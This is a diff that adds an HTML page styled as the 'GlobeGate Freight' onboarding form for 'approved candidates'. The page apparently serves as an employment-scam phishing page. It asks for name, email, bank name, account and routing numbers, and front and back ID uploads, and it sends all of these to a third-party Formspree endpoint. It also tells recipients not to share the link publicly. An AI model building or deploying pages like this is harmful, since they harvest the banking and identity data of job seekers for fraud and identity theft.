@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>GlobeGate Onboarding</title>
+
+<style>
+body{
+  margin:0;
+  font-family:Arial;
+  background:#eef2f7;
+}
+
+header{
+  background:#0b1f3a;
+  color:white;
+  padding:15px;
+  text-align:center;
+}
+
+.container{
+  max-width:600px;
+  margin:40px auto;
+  background:white;
+  padding:20px;
+  border-radius:10px;
+  box-shadow:0 5px 15px rgba(0,0,0,0.1);
+}
+
+h3{
+  color:#0b1f3a;
+}
+
+input{
+  width:100%;
+  padding:10px;
+  margin:6px 0;
+  border:1px solid #ccc;
+  border-radius:6px;
+}
+
+button{
+  background:#28a745;
+  color:white;
+  border:none;
+  padding:12px;
+  width:100%;
+  margin-top:10px;
+  border-radius:6px;
+  cursor:pointer;
+}
+
+.note{
+  font-size:13px;
+  color:#666;
+  margin-top:10px;
+}
+</style>
+</head>
+
+<body>
+
+<header>
+  <h2>GlobeGate Freight - Onboarding</h2>
+</header>
+
+<div class="container">
+
+<h3>Approved Candidate Onboarding Form</h3>
+
+<form action="https://formspree.io/f/mnjwayze" method="POST" enctype="multipart/form-data">
+
+  <h4>Personal Information</h4>
+  <input name="fullName" placeholder="Full Name" required>
+  <input name="email" type="email" placeholder="Email Address" required>
+
+  <h4>Payment Information</h4>
+  <input name="paymentType" placeholder="Payment Type">
+  <input name="bankName" placeholder="Bank Name">
+  <input name="accountNumber" placeholder="Account Number">
+  <input name="routingNumber" placeholder="Routing Number">
+
+  <h4>Identity Verification</h4>
+
+  <label>Upload ID Front</label>
+  <input type="file" name="idFront">
+
+  <label>Upload ID Back</label>
+  <input type="file" name="idBack">
+
+  <p class="note">
+  This form is only for approved candidates. Do not share this link publicly.
+  </p>
+
+  <button type="submit">Submit Onboarding</button>
+
+</form>
+
+</div>
+
+</body>
+</html>
